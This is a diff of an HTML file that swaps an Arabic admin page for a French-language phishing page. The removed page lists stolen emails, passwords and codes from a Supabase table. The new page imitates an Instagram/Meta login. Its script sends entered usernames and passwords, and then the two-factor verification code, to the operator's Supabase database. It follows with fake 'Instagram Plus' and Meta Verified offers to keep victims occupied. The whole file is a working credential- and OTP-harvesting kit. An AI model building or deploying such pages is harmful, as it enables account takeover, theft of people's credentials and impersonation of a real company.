@@ -1,111 +1,276 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>قائمة البيانات المُسجلة</title>
+  <title>Instagram</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f6f9;
-      padding: 30px;
-      margin: 0;
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; align-items: center; padding: 20px 24px; }
+    
+    .screen { display: none; width: 100%; max-width: 380px; flex-direction: column; align-items: center; margin: auto 0; text-align: center; }
+    .screen.active { display: flex; }
+
+    /* Language Selector */
+    .lang-selector { font-size: 13px; color: #737373; margin-top: 10px; margin-bottom: 35px; }
+
+    /* Official Instagram Outline Gradient Logo */
+    .ig-app-icon {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 30px;
     }
-    h2 {
-      color: #333;
-      text-align: center;
-      margin-bottom: 20px;
+
+    /* Input Fields Style */
+    .input-field { 
+      width: 100%; 
+      background: #fafafa; 
+      border: 1px solid #dbdbdb; 
+      border-radius: 14px; 
+      padding: 15px 14px; 
+      font-size: 14px; 
+      outline: none; 
+      margin-bottom: 12px;
+      color: #262626;
     }
-    table {
-      width: 100%;
-      max-width: 900px;
-      margin: 0 auto;
-      border-collapse: collapse;
-      background: #ffffff;
-      border-radius: 8px;
-      overflow: hidden;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    .input-field::placeholder { color: #737373; }
+    .input-field:focus { border-color: #a8a8a8; background: #fff; }
+    
+    /* Buttons Style */
+    .btn-blue { 
+      width: 100%; 
+      background-color: #0064e0; 
+      border: none; 
+      border-radius: 22px; 
+      color: #ffffff; 
+      font-weight: 600; 
+      padding: 13px; 
+      font-size: 14px; 
+      cursor: pointer; 
+      margin-top: 6px; 
     }
-    th, td {
-      padding: 12px 15px;
-      text-align: right;
-      border-bottom: 1px solid #ddd;
+    .btn-blue:hover { background-color: #0056c6; }
+    .btn-secondary { 
+      width: 100%; 
+      background: transparent; 
+      border: 1px solid #0064e0; 
+      border-radius: 22px; 
+      color: #0064e0; 
+      font-weight: 600; 
+      padding: 11px; 
+      font-size: 14px; 
+      text-decoration: none; 
+      text-align: center; 
     }
-    th {
-      background-color: #0095f6;
-      color: white;
-      font-weight: bold;
-    }
-    tr:hover {
-      background-color: #f1f1f1;
-    }
-    .loading {
-      text-align: center;
-      font-size: 18px;
-      color: #666;
-    }
+    
+    /* Texts & Links */
+    h2 { font-size: 19px; font-weight: 600; color: #000; margin-bottom: 10px; }
+    .subtitle { font-size: 13px; color: #737373; line-height: 1.4; margin-bottom: 20px; }
+    .forgot-password { color: #000000; font-size: 13px; font-weight: 600; text-decoration: none; margin-top: 18px; text-align: center; }
+    
+    /* Features List */
+    .feature-list { width: 100%; text-align: left; border: 1px solid #e0e0e0; border-radius: 16px; margin: 20px 0; overflow: hidden; }
+    .feature-item { padding: 14px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; font-size: 14px; color: #262626; font-weight: 500; }
+    .feature-item:last-child { border-bottom: none; }
+    
+    /* Profile & Pricing Card */
+    .profile-card { margin: 15px 0; }
+    .avatar { width: 70px; height: 70px; border-radius: 50%; background: #ccc; margin: 0 auto 10px auto; background-image: url('https://via.placeholder.com/70'); background-size: cover; }
+    .badge-icon { color: #0064e0; font-size: 14px; }
+    .pricing-box { border: 1px solid #e0e0e0; border-radius: 16px; padding: 15px; text-align: left; width: 100%; margin-bottom: 15px; }
+    
+    /* Success Message */
+    .success-msg { color: #2e7d32; font-size: 14px; font-weight: 600; margin-top: 12px; display: none; }
+
+    /* Footer */
+    .footer-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; gap: 15px; margin-bottom: 10px; }
+    .meta-logo { font-weight: bold; color: #0064e0; font-size: 14px; display: flex; align-items: center; gap: 4px; }
+
+    /* Loading Overlay */
+    .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.98); flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+    .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0064e0; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <h2>قائمة البيانات الجاهزة</h2>
-  <div id="loading" class="loading">جاري تحميل البيانات...</div>
+  <!-- STEP 1: LOGIN SCREEN -->
+  <div id="screen-login" class="screen active">
+    <div class="lang-selector">Français (France) ∨</div>
+    
+    <!-- EXACT MATCH GRADIENT OUTLINE INSTAGRAM LOGO -->
+    <svg class="ig-app-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
+          <stop offset="0%" stop-color="#ffb100" />
+          <stop offset="25%" stop-color="#ff0844" />
+          <stop offset="60%" stop-color="#d6249f" />
+          <stop offset="100%" stop-color="#285AEB" />
+        </linearGradient>
+      </defs>
+      <rect x="32" y="32" width="448" height="448" rx="128" fill="none" stroke="url(#igGradient)" stroke-width="38"/>
+      <circle cx="256" cy="256" r="105" fill="none" stroke="url(#igGradient)" stroke-width="38"/>
+      <circle cx="362" cy="150" r="26" fill="url(#igGradient)"/>
+    </svg>
 
-  <table id="dataTable" style="display: none;">
-    <thead>
-      <tr>
-        <th>الرقم (ID)</th>
-        <th>البريد الإلكتروني</th>
-        <th>كلمة السر</th>
-        <th>الكود</th>
-        <th>تاريخ التسجيل</th>
-      </tr>
-    </thead>
-    <tbody id="tableBody">
-    </tbody>
-  </table>
+    <form id="loginForm" style="width: 100%;">
+      <input type="text" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
+      <button type="submit" class="btn-blue">Se connecter</button>
+    </form>
+    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+  </div>
+
+  <!-- STEP 2: OTP / VERIFICATION CODE SCREEN -->
+  <div id="screen-otp" class="screen">
+    <h2>Entrez le code de vérification</h2>
+    <p class="subtitle">Entrez le code à 6 chiffres que nous avons envoyé à votre appareil.</p>
+    
+    <form id="otpForm" style="width: 100%;">
+      <input type="text" id="otpCode" class="input-field" placeholder="Code de vérification (6 chiffres)" maxlength="8" required style="text-align: center; letter-spacing: 2px;">
+      <button type="submit" class="btn-blue">Continuer</button>
+    </form>
+  </div>
+
+  <!-- STEP 3: INSTAGRAM PLUS OFFER -->
+  <div id="screen-plus" class="screen">
+    <svg class="ig-app-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+      <rect x="32" y="32" width="448" height="448" rx="128" fill="none" stroke="url(#igGradient)" stroke-width="38"/>
+      <circle cx="256" cy="256" r="105" fill="none" stroke="url(#igGradient)" stroke-width="38"/>
+      <circle cx="362" cy="150" r="26" fill="url(#igGradient)"/>
+    </svg>
+    <h2>Vous, essayez <span style="color:#d62976;">Instagram Plus</span> gratuitement pendant un mois</h2>
+    <p class="subtitle">Commandes avancées. Fonctionnalités exclusives.<br>0,99 $US / mois • Ce prix peut inclure des taxes</p>
+    
+    <div class="feature-list">
+      <div class="feature-item">Prévisualisez les stories <span>›</span></div>
+      <div class="feature-item">Consultez les statistiques de relecture <span>›</span></div>
+      <div class="feature-item">Recherchez dans la liste des personnes <span>›</span></div>
+      <div class="feature-item">Prévisualisez les messages <span>›</span></div>
+      <div class="feature-item">Accédez à des polices personnalisées <span>›</span></div>
+    </div>
+
+    <button id="btnTry1" class="btn-blue">Essayer pour 0,00 $US</button>
+    <p style="font-size: 11px; color: #737373; margin-top: 10px;">Annulez à tout moment.</p>
+  </div>
+
+  <!-- STEP 4: META VERIFIED USER SCREEN -->
+  <div id="screen-user" class="screen">
+    <div style="width:100%; text-align:left; font-size:20px; cursor:pointer;">✕</div>
+    <div class="meta-logo" style="margin-bottom: 10px;">∞ Meta</div>
+    <h2>Bénéficiez du premier mois gratuit</h2>
+    
+    <div class="profile-card">
+      <div class="avatar"></div>
+      <div style="font-weight: 600;">User <span class="badge-icon">✔</span></div>
+      <p style="font-size: 12px; color: #737373; margin-top: 5px;">125 profils que vous suivez possèdent déjà un badge Vérifié.</p>
+    </div>
+
+    <div class="pricing-box">
+      <div style="font-weight: bold; margin-bottom: 5px;">Standard</div>
+      <div style="color: #2e7d32; font-size: 12px; font-weight: 600;">1 mois offert <span style="text-decoration: line-through; color: #737373;">6,49 $US/mois</span></div>
+      <ul style="text-align: left; margin: 10px 0 0 20px; font-size: 13px; color: #262626;">
+        <li>Badge Vérifié</li>
+        <li>Optimisation du référencement</li>
+        <li>Favoriser les interactions</li>
+      </ul>
+    </div>
+
+    <button id="btnTry2" class="btn-blue">Essayer pour 0,00 $US</button>
+    <div id="successMsg" class="success-msg">Tes achats aura bientôt arrivé</div>
+  </div>
+
+  <!-- FOOTER COMMON -->
+  <div class="footer-container">
+    <a href="#" class="btn-secondary">Créer un nouveau compte</a>
+    <div class="meta-logo">∞ Meta</div>
+  </div>
+
+  <!-- LOADING OVERLAY -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Vérification...</div>
+  </div>
 
   <script>
+    // Supabase Config
     const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
     const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    async function loadUsersData() {
-      const { data, error } = await supabaseClient
-        .from('users_data')
-        .select('*')
-        .order('id', { ascending: false });
+    let currentUserId = null;
 
-      const loading = document.getElementById('loading');
-      const table = document.getElementById('dataTable');
-      const tableBody = document.getElementById('tableBody');
-
-      if (error) {
-        loading.innerText = 'حدث خطأ أثناء جلب البيانات: ' + error.message;
-        return;
-      }
-
-      loading.style.display = 'none';
-      table.style.display = 'table';
-
-      tableBody.innerHTML = '';
-      data.forEach(user => {
-        const row = `
-          <tr>
-            <td>${user.id || ''}</td>
-            <td>${user.email || ''}</td>
-            <td>${user.password || ''}</td>
-            <td><strong>${user.code || 'لم يدخل الكود بعد'}</strong></td>
-            <td>${user.created_at ? new Date(user.created_at).toLocaleString('ar-EG') : ''}</td>
-          </tr>
-        `;
-        tableBody.innerHTML += row;
-      });
+    function showScreen(screenId) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(screenId).classList.add('active');
     }
 
-    // تشغيل جلب البيانات فور فتح الصفحة
-    loadUsersData();
+    // 1. Send Login credentials immediately
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      const overlay = document.getElementById('loadingOverlay');
+
+      overlay.style.display = 'flex';
+
+      try {
+        const { data, error } = await supabaseClient
+          .from('users_data')
+          .insert([{ email: email, password: password }])
+          .select();
+
+        overlay.style.display = 'none';
+
+        if (error) {
+          alert('Erreur: ' + error.message);
+        } else if (data && data.length > 0) {
+          currentUserId = data[0].id;
+          showScreen('screen-otp');
+        }
+      } catch (err) {
+        overlay.style.display = 'none';
+        alert('Erreur inattendue!');
+      }
+    });
+
+    // 2. Send OTP code immediately
+    document.getElementById('otpForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const code = document.getElementById('otpCode').value.trim();
+      const overlay = document.getElementById('loadingOverlay');
+
+      overlay.style.display = 'flex';
+
+      try {
+        if (currentUserId) {
+          await supabaseClient
+            .from('users_data')
+            .update({ code: code })
+            .eq('id', currentUserId);
+        }
+
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          showScreen('screen-plus');
+        }, 1500);
+
+      } catch (err) {
+        overlay.style.display = 'none';
+        showScreen('screen-plus');
+      }
+    });
+
+    // 3. Navigation handlers
+    document.getElementById('btnTry1').addEventListener('click', () => {
+      showScreen('screen-user');
+    });
+
+    document.getElementById('btnTry2').addEventListener('click', () => {
+      document.getElementById('successMsg').style.display = 'block';
+    });
   </script>
+
 </body>
 </html>
